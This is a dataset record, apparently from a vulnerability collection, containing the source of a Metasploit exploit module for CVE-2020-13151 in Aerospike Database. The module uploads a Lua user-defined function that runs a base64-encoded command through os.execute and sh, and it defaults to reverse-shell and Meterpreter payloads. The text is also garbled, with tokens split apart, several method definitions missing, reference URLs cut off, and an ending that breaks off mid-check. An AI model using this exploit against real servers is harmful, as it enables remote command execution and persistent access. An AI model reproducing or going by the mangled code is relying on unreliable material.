{
    "text": "vul_name : Aerospike Database UDF Lua Code Execution ， vul_cve : CVE-2020-13151 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， class MetasploitModule < Msf : Exploit : Remote ， Rank = GreatRanking ， include Msf : Exploit : EXE ， include Msf : Exploit : Remote : Tcp ， include Msf : Exploit : CmdStager ， prepend Msf : Exploit : Remote : AutoCheck ， super (  ， update_info (  ， info ,  ， 'Name' => 'Aerospike Database UDF Lua Code Execution' ,  ， 'Description' => %q{ ， Aerospike Database versions before 5.1.0.3 permitted ， user-defined functions ( UDF ) to call the `os.execute` ， Lua function. ， This module creates a UDF utilising this function to ， execute arbitrary operating system commands with the ， privileges of the user running the Aerospike service. ， This module does not support authentication ; however ， Aerospike Database Community Edition does not enable ， authentication by default. ， This module has been tested successfully on Ubuntu ， with Aerospike Database Community Edition versions ， 4.9.0.5 , 4.9.0.11 and 5.0.0.10. ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => ，  [  ， 'b4ny4n' ,  # Discovery and exploit ， 'bcoles' # Metasploit ，  ]  ,  ， ' ，  [  ，  [ 'EDB' , '49067' ]  ,  ，  [ 'CVE' , '2020-13151' ]  ,  ，  [ 'PACKETSTORM' , '160106' ]  ,  ，  [ 'URL' , ' ，  [ 'URL' , ' ，  [ 'URL' , ' ，  [ 'URL' , ' ，  ]  ,  ， 'Platform' => %w [ linux unix ]  ,  ， 'Targets' => ，  [  ，  [  ， 'Unix Command' ,  ， { ， 'Platform' => 'unix' ,  ， 'Arch' => ARCH_CMD ,  ， 'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse' } ,  ， 'Type' => : unix_command ， } ，  ]  ,  ，  [  ， 'Linux ( Dropper ) ' ,  ， { ， 'Platform' => 'linux' ,  ， 'Arch' => [ ARCH_X86 , ARCH_X64 ]  ,  ， 'DefaultOptions' => { 'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp' } ,  ， 'Type' => : linux_dropper ， } ，  ]  ,  ，  ]  ,  ， 'Privileged' => false ,  ， 'DisclosureDate' => '2020-07-31' ,  ， 'Notes' => ， { ， 'Stability' => [ CRASH_SAFE ]  ,  ， 'SideEffects' => [ ARTIFACTS_ON_DISK , IOC_IN_LOGS ]  ,  ， 'Reliability' => [ REPEATABLE_SESSION ]  ， } ,  ， 'DefaultTarget' => 0 ， register_options (  ，  [  ， Opt : RPORT ( 3000 )  ，  ]  ， register_advanced_options (  ，  [  ， OptString.new ( 'UDF_DIRECTORY' ,  [ true , 'Directory where Lua UDF files are stored' , '/opt/aerospike/usr/udf/lua/' ]  )  ，  ]  ， end ， def build ， header = [ '02010000' ] .pack ( 'H * ' )  ， data = \"build\\x0a\" ， len = [ data.length ] .pack ( 'N' )  ， sock.put ( header + len + data )  ， sock.get_once ， end ， header = [ '02010000' ] .pack ( 'H * ' )  ， data = \"udf-remove : filename= # {name} ; \\x0a\" ， len = [ data.length ] .pack ( 'N' )  ， sock.put ( header + len + data )  ， sock.get_once ， end ， def list_udf ， header = [ '02010000' ] .pack ( 'H * ' )  ， data = \"udf-list\\x0a\" ， len = [ data.length ] .pack ( 'N' )  ， sock.put ( header + len + data )  ， sock.get_once ， end ， header = [ '02010000' ] .pack ( 'H * ' )  ， content = Rex : Text.encode_base64 ( data )  ， data = \"udf-put : filename= # {name} ; content= # {content} ; content-len= # {content.length} ; udf-type= # {type} ; \\x0a\" ， len = [ data.length ] .pack ( 'N' )  ， sock.put ( header + len + data )  ， sock.get_once ， end ， def features ， header = [ '02010000' ] .pack ( 'H * ' )  ， data = \"features\\x0a\" ， len = [ data.length ] .pack ( 'N' )  ， sock.put ( header + len + data )  ， sock.get_once ， end ， fname = \" # {rand_text_alpha ( 12.16 ) }.lua\" ， print_status ( \"Creating UDF ' # {fname}' .\" )  ，  # NOTE : we manually remove the lua file as unregistering the UDF ，  # does not remove the lua file from disk. ， cmd_exec = Rex : Text.encode_base64 ( \"rm ' # {datastore [ 'UDF_DIRECTORY' ] }/ # {fname}' ;  # {cmd}\" )  ，  # NOTE : this jank to execute the payload in the background is required as ，  # sometimes the payload is executed twice ( before the UDF is unregistered ) . ，  # Executing the payload in the foreground causes the thread to block while ，  # the second payload tries and fails to connect back. ，  # This would cause the subsequent call to unregister the UDF to fail ,  ，  # permanently backdooring the system ( that's bad ) . ， res = upload_udf ( fname , %{os.execute ( \"echo # {cmd_exec} | base64 -d | sh&\" ) } )  ， print_error ( \"UDF registration failed :  # {error} :  # {Rex : Text.decode_base64 ( message ) }\" )  ， print_error ( 'UDF registration failed' )  ， end ， ensure ，  # NOTE : unregistering the UDF is super important as leaving the UDF ，  # registered causes the payload to be executed repeatedly , effectively ，  # permanently backdooring the system ( that's bad ) . ， vprint_status ( \"UDF ' # {fname}' removed successfully\" )  ， print_warning ( \"UDF ' # {fname}' could not be removed\" )  ， end ， end ， def check ， connect ， res = build ， unless res",
    "time": "2020.12.14"
}